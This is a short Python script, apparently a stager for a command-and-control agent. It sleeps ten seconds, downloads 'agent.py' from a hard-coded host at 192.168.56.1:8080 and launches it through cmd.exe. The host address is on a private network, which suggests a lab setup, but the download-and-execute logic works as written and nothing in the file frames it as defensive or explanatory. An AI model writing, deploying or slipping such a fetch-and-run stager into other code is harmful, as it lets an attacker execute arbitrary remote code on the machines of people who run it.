import os, sys, time, subprocess, requests, json


def download(url):
    file_name = os.path.basename(url)
    res = requests.get(url, stream=True)
    if res.status_code == 200:
        with open(file_name, 'wb') as file:
            for chunk in res.iter_content(chunk_size=1024):
                file.write(chunk)

 
if __name__ == '__main__':

    print("wait...\n")
    time.sleep(10)

    agent_url = 'http://192.168.56.1:8080/agent.py'

    download(agent_url)

    subprocess.run(['cmd.exe', "/c", "start", "python", "agent.py"])    
